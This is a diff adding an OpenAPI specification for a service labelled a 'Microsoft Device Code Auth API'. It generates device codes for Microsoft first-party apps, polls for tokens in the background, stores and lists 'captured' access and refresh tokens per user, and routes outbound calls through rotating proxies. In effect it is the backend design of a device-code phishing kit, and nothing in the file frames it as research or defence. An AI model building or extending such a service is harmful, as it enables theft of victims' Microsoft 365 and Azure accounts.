@@ -1,0 +1,669 @@
+openapi: 3.1.0
+info:
+  # Do not change the title, if the title changes, the import paths will be broken
+  title: Api
+  version: 0.1.0
+  description: Microsoft Device Code Auth API
+servers:
+  - url: /api
+    description: Base API path
+tags:
+  - name: health
+    description: Health operations
+  - name: auth
+    description: Device code authentication flow
+  - name: admin
+    description: Admin / proxy configuration
+paths:
+  /healthz:
+    get:
+      operationId: healthCheck
+      tags: [health]
+      summary: Health check
+      responses:
+        "200":
+          description: Healthy
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/HealthStatus"
+
+  /apps:
+    get:
+      operationId: listApps
+      tags: [auth]
+      summary: List all supported app aliases
+      description: >
+        Returns the list of supported app aliases and their display names.
+        Use the alias value as the `app` parameter in /generatecode and /regeneratecode.
+      responses:
+        "200":
+          description: List of apps
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/AppListResponse"
+
+  /generatecode:
+    get:
+      operationId: generateCode
+      tags: [auth]
+      summary: Generate a device code
+      description: >
+        Accepts a short app alias (e.g. "azure-cli") — the backend resolves it
+        to the full Microsoft client_id internally. Returns the user_code
+        immediately after the upstream response. Background polling against
+        Microsoft token endpoint starts automatically server-side.
+        Rate-limited to 2 requests per IP per 900-second window.
+        Proxies are applied server-side automatically if configured.
+      parameters:
+        - name: app
+          in: query
+          required: false
+          schema:
+            type: string
+            enum:
+              - azure-cli
+              - azure-powershell
+              - msgraph
+              - office365
+              - exchange
+              - sharepoint
+              - msteams
+            default: azure-cli
+          description: Short app alias. Backend resolves this to the full client_id.
+      responses:
+        "200":
+          description: user_code ready for display
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/GenerateCodeResponse"
+        "400":
+          description: Unknown app alias
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "429":
+          description: Rate limit exceeded
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/RateLimitError"
+        "502":
+          description: Upstream Microsoft auth service error
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /regeneratecode:
+    post:
+      operationId: regenerateCode
+      tags: [auth]
+      summary: Regenerate a device code
+      description: >
+        Generates a new device code for the given app alias.
+        Returns 409 if a valid code is still active for that alias.
+        Rate-limited (shared window with /generatecode).
+      requestBody:
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/RegenerateCodeBody"
+      responses:
+        "200":
+          description: New user_code ready for display
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/GenerateCodeResponse"
+        "400":
+          description: Unknown app alias
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "409":
+          description: Active code still valid — must wait for expiry
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ActiveCodeConflict"
+        "429":
+          description: Rate limit exceeded
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/RateLimitError"
+        "502":
+          description: Upstream Microsoft auth service error
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /code-status/{userCode}:
+    get:
+      operationId: getCodeStatus
+      tags: [auth]
+      summary: Get status of a device code
+      parameters:
+        - name: userCode
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Code status
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/CodeStatusResponse"
+        "404":
+          description: Code not found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /admin/tokens:
+    get:
+      operationId: listTokens
+      tags: [admin]
+      summary: List captured access and refresh tokens (admin)
+      description: >
+        Returns all stored access and refresh tokens. Optionally filter by app alias.
+        Requires X-Admin-Key header.
+      parameters:
+        - name: app
+          in: query
+          required: false
+          schema:
+            type: string
+          description: Filter by app alias (e.g. msgraph). Omit to list all.
+      responses:
+        "200":
+          description: Token list
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/TokenListResponse"
+        "400":
+          description: Unknown alias
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "401":
+          description: Unauthorized
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /admin/tokens/{id}:
+    delete:
+      operationId: deleteToken
+      tags: [admin]
+      summary: Delete a stored token by ID (admin)
+      description: >
+        Deletes one access or refresh token record by its numeric ID.
+        Pass ?type=access (default) or ?type=refresh.
+        Requires X-Admin-Key header.
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+        - name: type
+          in: query
+          required: false
+          schema:
+            type: string
+            enum: [access, refresh]
+            default: access
+      responses:
+        "200":
+          description: Deleted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/DeleteTokenResponse"
+        "400":
+          description: Invalid id or type
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "401":
+          description: Unauthorized
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "404":
+          description: Token not found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /admin/codes:
+    get:
+      operationId: listCodes
+      tags: [admin]
+      summary: List all device code records (admin)
+      description: >
+        Returns all device code records. Filter by app alias and/or status.
+        Requires X-Admin-Key header.
+      parameters:
+        - name: app
+          in: query
+          required: false
+          schema:
+            type: string
+          description: Filter by app alias
+        - name: status
+          in: query
+          required: false
+          schema:
+            type: string
+            enum: [POLLING, SUCCESS, EXPIRED]
+          description: Filter by status
+      responses:
+        "200":
+          description: Code list
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/CodeListResponse"
+        "400":
+          description: Unknown alias
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "401":
+          description: Unauthorized
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+  /proxies:
+    get:
+      operationId: getProxyCount
+      tags: [admin]
+      summary: Get the number of configured proxies
+      responses:
+        "200":
+          description: Proxy count
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ProxyCountResponse"
+    post:
+      operationId: setProxies
+      tags: [admin]
+      summary: Set the proxy rotation list
+      description: >
+        Configures the server-side proxy rotation list. All outbound calls to
+        Microsoft APIs will rotate through these proxies automatically.
+        If no proxies are configured the server uses its origin IP.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/ProxyListBody"
+      responses:
+        "200":
+          description: Proxies configured
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ProxySetResponse"
+        "400":
+          description: Invalid proxy list
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+
+components:
+  schemas:
+    HealthStatus:
+      type: object
+      properties:
+        status:
+          type: string
+      required:
+        - status
+
+    AppListResponse:
+      type: object
+      properties:
+        apps:
+          type: array
+          items:
+            type: object
+            properties:
+              alias:
+                type: string
+              name:
+                type: string
+            required:
+              - alias
+              - name
+      required:
+        - apps
+
+    GenerateCodeResponse:
+      type: object
+      properties:
+        user_code:
+          type: string
+          description: The code the user enters at aka.ms/devicelogin
+        expires_at:
+          type: string
+          format: date-time
+        expires_in:
+          type: integer
+          description: Seconds until the code expires (always 900)
+        app:
+          type: string
+          description: Display name of the app
+      required:
+        - user_code
+        - expires_at
+        - expires_in
+        - app
+
+    RegenerateCodeBody:
+      type: object
+      properties:
+        app:
+          type: string
+          description: >
+            Short app alias — same values as the `app` query param on /generatecode.
+          enum:
+            - azure-cli
+            - azure-powershell
+            - msgraph
+            - office365
+            - exchange
+            - sharepoint
+            - msteams
+
+    CodeStatusResponse:
+      type: object
+      properties:
+        user_code:
+          type: string
+        status:
+          type: string
+          enum: [POLLING, SUCCESS, EXPIRED]
+        app:
+          type: string
+          description: Display name of the app
+        alias:
+          type: string
+          description: Short alias used to generate this code
+        generated_at:
+          type: string
+          format: date-time
+        expires_at:
+          type: string
+          format: date-time
+        expires_in:
+          type: integer
+        last_polled_at:
+          type: string
+          format: date-time
+          nullable: true
+      required:
+        - user_code
+        - status
+        - app
+        - alias
+        - generated_at
+        - expires_at
+        - expires_in
+
+    ActiveCodeConflict:
+      type: object
+      properties:
+        error:
+          type: string
+        user_code:
+          type: string
+        expires_in:
+          type: integer
+        expires_at:
+          type: string
+          format: date-time
+      required:
+        - error
+        - user_code
+        - expires_in
+        - expires_at
+
+    RateLimitError:
+      type: object
+      properties:
+        error:
+          type: string
+        reset_at:
+          type: string
+          format: date-time
+      required:
+        - error
+        - reset_at
+
+    ErrorResponse:
+      type: object
+      properties:
+        error:
+          type: string
+      required:
+        - error
+
+    ProxyCountResponse:
+      type: object
+      properties:
+        count:
+          type: integer
+      required:
+        - count
+
+    ProxySetResponse:
+      type: object
+      properties:
+        message:
+          type: string
+        count:
+          type: integer
+      required:
+        - message
+        - count
+
+    ProxyListBody:
+      type: object
+      properties:
+        proxies:
+          type: array
+          items:
+            type: object
+            properties:
+              url:
+                type: string
+                format: uri
+            required:
+              - url
+      required:
+        - proxies
+
+    AccessTokenRecord:
+      type: object
+      properties:
+        id:
+          type: integer
+        app:
+          type: string
+        alias:
+          type: string
+        user:
+          type: string
+        scopes:
+          type: string
+        resource:
+          type: string
+        issued:
+          type: string
+          format: date-time
+        expires:
+          type: string
+          format: date-time
+        expired:
+          type: boolean
+        access_token:
+          type: string
+      required:
+        - id
+        - app
+        - alias
+        - user
+        - scopes
+        - resource
+        - issued
+        - expires
+        - expired
+        - access_token
+
+    RefreshTokenRecord:
+      type: object
+      properties:
+        id:
+          type: integer
+        app:
+          type: string
+        alias:
+          type: string
+        user:
+          type: string
+        resource:
+          type: string
+        stored_at:
+          type: string
+          format: date-time
+        foci:
+          type: string
+          nullable: true
+      required:
+        - id
+        - app
+        - alias
+        - user
+        - resource
+        - stored_at
+
+    TokenListResponse:
+      type: object
+      properties:
+        filter:
+          type: string
+        access_tokens:
+          type: array
+          items:
+            $ref: "#/components/schemas/AccessTokenRecord"
+        refresh_tokens:
+          type: array
+          items:
+            $ref: "#/components/schemas/RefreshTokenRecord"
+        counts:
+          type: object
+          properties:
+            access_tokens:
+              type: integer
+            refresh_tokens:
+              type: integer
+          required:
+            - access_tokens
+            - refresh_tokens
+      required:
+        - filter
+        - access_tokens
+        - refresh_tokens
+        - counts
+
+    DeleteTokenResponse:
+      type: object
+      properties:
+        deleted:
+          type: boolean
+        type:
+          type: string
+        id:
+          type: integer
+      required:
+        - deleted
+        - type
+        - id
+
+    CodeRecord:
+      type: object
+      properties:
+        user_code:
+          type: string
+        app:
+          type: string
+        alias:
+          type: string
+        status:
+          type: string
+          enum: [POLLING, SUCCESS, EXPIRED]
+        generated_at:
+          type: string
+          format: date-time
+        expires_at:
+          type: string
+          format: date-time
+        last_polled_at:
+          type: string
+          format: date-time
+          nullable: true
+      required:
+        - user_code
+        - app
+        - alias
+        - status
+        - generated_at
+        - expires_at
+
+    CodeListResponse:
+      type: object
+      properties:
+        filter:
+          type: object
+          properties:
+            app:
+              type: string
+            status:
+              type: string
+          required:
+            - app
+            - status
+        codes:
+          type: array
+          items:
+            $ref: "#/components/schemas/CodeRecord"
+        count:
+          type: integer
+      required:
+        - filter
+        - codes
+        - count
